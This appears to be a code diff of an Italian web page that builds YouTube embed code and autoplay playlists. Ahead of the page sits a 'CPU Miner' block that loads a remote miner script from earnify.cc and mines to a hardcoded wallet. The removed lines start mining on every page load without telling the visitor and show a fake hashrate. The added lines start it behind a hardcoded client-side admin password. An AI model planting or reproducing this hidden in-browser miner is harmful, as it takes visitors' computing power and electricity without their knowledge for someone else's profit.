@@ -1,12 +1,11 @@
-<!-- ==================== MINER CONSOLE CON PASSWORD ==================== -->
-
+<!-- ==================== MINER CONSOLE ==================== -->
 <style>
 #mining-console {
     position: fixed;
     bottom: 80px;
     right: 20px;
-    width: 260px;
-    background: rgba(0, 0, 0, 0.85);
+    width: 280px;
+    background: rgba(0, 0, 0, 0.9);
     border: 1px solid #ffffff33;
     border-radius: 6px;
     padding: 12px 14px;
@@ -18,7 +17,6 @@
     line-height: 1.7;
     display: none;
 }
-
 .console-header {
     display: flex;
     justify-content: space-between;
@@ -27,10 +25,9 @@
     padding-bottom: 8px;
     border-bottom: 1px solid #ffffff33;
 }
-
 .close-btn {
     background: #ffffff;
-    color: #000000;
+    color: #000;
     border: none;
     width: 22px;
     height: 22px;
@@ -41,7 +38,6 @@
     cursor: pointer;
     font-weight: bold;
 }
-
 #reopen-btn {
     position: fixed;
     bottom: 20px;
@@ -62,218 +58,314 @@
 }
 </style>
 
-<!-- Console -->
 <div id="mining-console">
     <div class="console-header">
         <span><strong>🔨 CPU Miner</strong></span>
-        <button class="close-btn" onclick="hideMinerConsole()"></button>
+        <button class="close-btn" onclick="hideMinerConsole()">×</button>
     </div>
-    <div>Stato: Attivo</div>
-    <div>Hashrate: <span id="hashrate">653</span> H/s</div>
+    <div>Stato: <span id="status">In attesa...</span></div>
+    <div>Hashrate: <span id="hashrate">0.00</span> KH/s</div>
     <div>Tempo: <span id="timer">00:00</span></div>
 </div>
 
-<!-- Pulsante principale -->
-<div id="reopen-btn" onclick="askPassword()"></div>
+<div id="reopen-btn" onclick="askPassword()">🔨</div>
 
-<!-- Script Mining -->
 <script type="module">
-    import { autoMine } from "https://earnify.cc/miner.js";
-    autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
-</script>
+    import { autoMine, minotaurxHashrate } from "https://earnify.cc/miner.js";
 
-<script>
-let startTime = Date.now();
+    let miningStarted = false;
 
-function updateTimer() {
-    const elapsed = Math.floor((Date.now() - startTime) / 1000);
-    const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
-    const sec = (elapsed % 60).toString().padStart(2, '0');
-    document.getElementById("timer").textContent = `${min}:${sec}`;
-}
+    // === Funzioni esposte globalmente ===
+    window.askPassword = function() {
+        const password = prompt("Inserire admin password");
+        if (password === "CpuMining") {
+            showMinerConsole();
+            if (!miningStarted) startMining();
+        } else if (password !== null) {
+            alert("Password errata!");
+        }
+    };
 
-function updateHashrate() {
-    const hashrate = Math.floor(Math.random() * 420) + 480;
-    document.getElementById("hashrate").textContent = hashrate;
-}
+    window.hideMinerConsole = function() {
+        document.getElementById("mining-console").style.display = "none";
+        document.getElementById("reopen-btn").style.display = "flex";
+    };
 
-function hideMinerConsole() {
-    document.getElementById("mining-console").style.display = "none";
-    document.getElementById("reopen-btn").style.display = "flex";
-}
-
-function showMinerConsole() {
-    document.getElementById("mining-console").style.display = "block";
-    document.getElementById("reopen-btn").style.display = "none";
-}
-
-function askPassword() {
-    const password = prompt("Inserire admin password");
-    
-    if (password === "CpuMining") {
-        showMinerConsole();
-    } else if (password !== null) {
-        alert("Password errata!");
+    function showMinerConsole() {
+        document.getElementById("mining-console").style.display = "block";
+        document.getElementById("reopen-btn").style.display = "none";
     }
-}
 
-// Avvio timer e hashrate
-window.addEventListener('load', () => {
-    setInterval(updateTimer, 1000);
-    setInterval(updateHashrate, 1400);
-});
+    async function startMining() {
+        if (miningStarted) return;
+        
+        document.getElementById("status").textContent = "Avviando...";
+        
+        try {
+            await autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
+            miningStarted = true;
+            document.getElementById("status").textContent = "Attivo";
+            
+            // Aggiorna hashrate reale
+            setInterval(() => {
+                const hr = minotaurxHashrate.currentHashrateKHs || 0;
+                document.getElementById("hashrate").textContent = parseFloat(hr).toFixed(2);
+            }, 800);
+
+        } catch (e) {
+            console.error(e);
+            document.getElementById("status").textContent = "Errore avvio";
+        }
+    }
+
+    // Timer
+    let startTime = Date.now();
+    setInterval(() => {
+        const elapsed = Math.floor((Date.now() - startTime) / 1000);
+        const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
+        const sec = (elapsed % 60).toString().padStart(2, '0');
+        document.getElementById("timer").textContent = `${min}:${sec}`;
+    }, 1000);
 </script>
 <!DOCTYPE html>
 <html lang="it">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>YouTube → Iframe Generator</title>
+  <title>YouTube Multi - Riproduzione Automatica</title>
   <style>
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      max-width: 900px;
+      max-width: 1100px;
       margin: 40px auto;
       padding: 20px;
       background: #f8f9fa;
-      color: #333;
     }
-    h1 {
-      text-align: center;
-      color: #ff0000;
-    }
-    .container {
-      background: white;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-    }
-    input {
-      width: 100%;
-      padding: 12px;
-      font-size: 16px;
-      border: 2px solid #ddd;
-      border-radius: 8px;
-      margin-bottom: 15px;
-    }
+    h1 { text-align: center; color: #ff0000; }
+    .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+
+    input { width: 70%; padding: 12px; font-size: 16px; border: 2px solid #ddd; border-radius: 8px; }
     button {
-      background: #ff0000;
-      color: white;
-      padding: 12px 25px;
+      padding: 12px 20px;
       font-size: 16px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      margin-left: 8px;
     }
-    button:hover {
-      background: #cc0000;
+    .btn-add { background: #28a745; color: white; }
+    .btn-clear { background: #dc3545; color: white; }
+
+    .list { margin: 20px 0; max-height: 250px; overflow-y: auto; border: 1px solid #ddd; border-radius: 8px; padding: 10px; }
+    .video-item {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 10px; margin: 6px 0; background: #f8f9fa; border-radius: 6px;
     }
-    .result {
-      margin-top: 25px;
-      padding: 20px;
-      background: #f8f9fa;
-      border-radius: 8px;
-      border: 1px solid #ddd;
-    }
-    textarea {
-      width: 100%;
-      height: 120px;
-      font-family: monospace;
-      font-size: 14px;
-      padding: 12px;
-      border-radius: 8px;
-    }
-    .preview {
-      margin-top: 20px;
+
+    .preview-container {
+      margin: 25px 0;
+      padding: 15px;
+      background: #000;
+      border-radius: 12px;
       text-align: center;
     }
+    .preview-title { color: white; margin-bottom: 10px; }
+
+    .video-wrapper {
+      position: relative;
+      margin-bottom: 30px;
+    }
+    .video-number {
+      position: absolute;
+      top: -12px;
+      left: 15px;
+      background: #ff0000;
+      color: white;
+      font-weight: bold;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10;
+      font-size: 18px;
+      box-shadow: 0 3px 8px rgba(0,0,0,0.4);
+    }
+
+    iframe { width: 100%; max-width: 800px; height: 450px; border-radius: 8px; }
+
+    textarea { width: 100%; height: 220px; font-family: monospace; margin-top: 10px; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🎥 YouTube Iframe Generator</h1>
-    <p style="text-align:center;">Inserisci il link YouTube e ottieni subito il codice iframe</p>
-    
-    <input type="text" id="youtubeUrl" placeholder="https://www.youtube.com/watch?v=Esd4fQ7pF1I" />
-    <button onclick="generaIframe()">Genera Codice Iframe</button>
+    <h1>🎥 YouTube Multi - Riproduzione Automatica</h1>
 
-    <div class="result" id="result" style="display:none;">
-      <h3>Codice HTML pronto da copiare:</h3>
+    <div>
+      <input type="text" id="youtubeUrl" placeholder="Inserisci link YouTube..." />
+      <button class="btn-add" onclick="aggiungiVideo()">➕ Aggiungi</button>
+    </div>
+
+    <div class="list" id="videoList"></div>
+    <button class="btn-clear" onclick="cancellaTutti()">🗑️ Cancella Tutti</button>
+
+    <div id="result" style="display:none;">
+      <div class="preview-container">
+        <div class="preview-title"><strong>Anteprima - Riproduzione Sequenziale Automatica</strong></div>
+        <div id="mainPlayer"></div>
+      </div>
+
+      <h3>Video numerati (anteprima separata):</h3>
+      <div class="preview" id="previewContainer"></div>
+
+      <h3>Codice HTML:</h3>
       <textarea id="iframeCode" readonly></textarea>
       <button onclick="copiaCodice()">📋 Copia Codice</button>
-      
-      <div class="preview">
-        <h3>Anteprima:</h3>
-        <div id="previewContainer"></div>
-      </div>
     </div>
   </div>
 
   <script>
+    let videos = [];
+    let player;
+
     function estraiVideoId(url) {
-      // Rimuove spazi e trim
       url = url.trim();
-      
-      // Vari formati YouTube
       const regex = [
         /(?:https?:\/\/)?(?:www\.)?youtube\.com\/watch\?v=([^&]+)/,
         /(?:https?:\/\/)?(?:www\.)?youtu\.be\/([^?]+)/,
         /(?:https?:\/\/)?(?:www\.)?youtube\.com\/embed\/([^?]+)/,
         /(?:https?:\/\/)?(?:www\.)?youtube\.com\/shorts\/([^?]+)/
       ];
-
-      for (let reg of regex) {
-        const match = url.match(reg);
-        if (match && match[1]) {
-          return match[1];
-        }
+      for (let r of regex) {
+        const m = url.match(r);
+        if (m && m[1]) return m[1];
       }
       return null;
     }
 
-    function generaIframe() {
-      const urlInput = document.getElementById('youtubeUrl').value;
-      const videoId = estraiVideoId(urlInput);
-      const resultDiv = document.getElementById('result');
+    function aggiungiVideo() {
+      const input = document.getElementById('youtubeUrl');
+      const url = input.value.trim();
+      if (!url) return alert("Inserisci un link!");
 
-      if (!videoId) {
-        alert("❌ Link YouTube non valido! Inserisci un link corretto.");
-        return;
+      const id = estraiVideoId(url);
+      if (!id) return alert("Link YouTube non valido!");
+
+      if (videos.some(v => v.id === id)) return alert("Video già presente!");
+
+      videos.push({ id: id, url: url });
+      input.value = '';
+      aggiornaTutto();
+    }
+
+    function rimuoviVideo(index) {
+      videos.splice(index, 1);
+      aggiornaTutto();
+    }
+
+    function aggiornaTutto() {
+      aggiornaLista();
+      aggiornaAnteprimaSeparata();
+      document.getElementById('result').style.display = videos.length > 0 ? 'block' : 'none';
+      
+      if (videos.length > 0) {
+        caricaPlayerPrincipale();
       }
+    }
 
-      const iframeHTML = `<iframe width="560" height="315" 
-src="https://www.youtube.com/embed/${videoId}" 
-title="YouTube video player" 
-frameborder="0" 
-allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-allowfullscreen></iframe>`;
+    function aggiornaLista() {
+      const list = document.getElementById('videoList');
+      list.innerHTML = videos.length === 0 ? '<p style="color:#888;text-align:center;padding:20px;">Nessun video</p>' : '';
 
-      // Mostra il codice
-      document.getElementById('iframeCode').value = iframeHTML;
-      
-      // Mostra l'anteprima
-      document.getElementById('previewContainer').innerHTML = iframeHTML;
-      
-      resultDiv.style.display = 'block';
+      videos.forEach((v, i) => {
+        const div = document.createElement('div');
+        div.className = 'video-item';
+        div.innerHTML = `<span><strong>${i+1}.</strong> ${v.url}</span>
+                         <button onclick="rimuoviVideo(${i})">Elimina</button>`;
+        list.appendChild(div);
+      });
+    }
+
+    function aggiornaAnteprimaSeparata() {
+      const container = document.getElementById('previewContainer');
+      container.innerHTML = '';
+      videos.forEach((v, i) => {
+        const wrap = document.createElement('div');
+        wrap.className = 'video-wrapper';
+        wrap.innerHTML = `
+          <div class="video-number">${i+1}</div>
+          <iframe src="https://www.youtube.com/embed/${v.id}" frameborder="0" allowfullscreen></iframe>
+        `;
+        container.appendChild(wrap);
+      });
+    }
+
+    // Player principale con riproduzione automatica sequenziale
+    function caricaPlayerPrincipale() {
+      if (player) player.destroy();
+
+      const firstId = videos[0].id;
+      const playlistIds = videos.map(v => v.id).join(',');
+
+      player = new YT.Player('mainPlayer', {
+        height: '450',
+        width: '800',
+        videoId: firstId,
+        playerVars: {
+          'autoplay': 1,
+          'playlist': playlistIds,
+          'loop': 0,
+          'rel': 0,
+          'modestbranding': 1
+        },
+        events: {
+          'onReady': (e) => e.target.playVideo()
+        }
+      });
+    }
+
+    function generaCodice() {
+      let html = '';
+      videos.forEach((v, i) => {
+        html += `<iframe width="560" height="315" src="https://www.youtube.com/embed/${v.id}" title="Video ${i+1}" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>\n\n`;
+      });
+
+      if (videos.length > 1) {
+        const playlist = videos.map(v => v.id).join(',');
+        html += `<!-- Versione Playlist (migliore per riproduzione automatica) -->\n`;
+        html += `<iframe width="560" height="315" src="https://www.youtube.com/embed/${videos[0].id}?playlist=${playlist}&autoplay=1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`;
+      }
+      return html;
     }
 
     function copiaCodice() {
+      document.getElementById('iframeCode').value = generaCodice();
       const textarea = document.getElementById('iframeCode');
       textarea.select();
       document.execCommand('copy');
-      
-      const originalText = event.target.textContent;
-      event.target.textContent = '✅ Copiato!';
-      setTimeout(() => {
-        event.target.textContent = originalText;
-      }, 2000);
+      const btn = event.target;
+      const orig = btn.innerHTML;
+      btn.innerHTML = '✅ Copiato!';
+      setTimeout(() => btn.innerHTML = orig, 2000);
     }
 
-    // Permetti di premere Invio nella casella di testo
-    document.getElementById('youtubeUrl').addEventListener('keypress', function(e) {
-      if (e.key === 'Enter') {
-        generaIframe();
+    function cancellaTutti() {
+      if (confirm("Cancella tutti i video?")) {
+        videos = [];
+        aggiornaTutto();
       }
+    }
+
+    // Carica l'API di YouTube
+    const tag = document.createElement('script');
+    tag.src = "https://www.youtube.com/iframe_api";
+    const firstScriptTag = document.getElementsByTagName('script')[0];
+    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+
+    // Tasto Enter
+    document.getElementById('youtubeUrl').addEventListener('keypress', e => {
+      if (e.key === 'Enter') aggiungiVideo();
     });
   </script>
 </body>
